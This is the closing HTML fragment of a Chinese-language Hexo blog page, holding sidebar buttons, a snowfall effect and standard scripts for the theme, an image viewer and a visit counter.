id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div><canvas id="snow" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none"></canvas></div><script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script><script async type="text/javascript" src="https://cdn.jsdelivr.net/gh/Candinya/Kratos-Rebirth@latest/source/js/snow.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>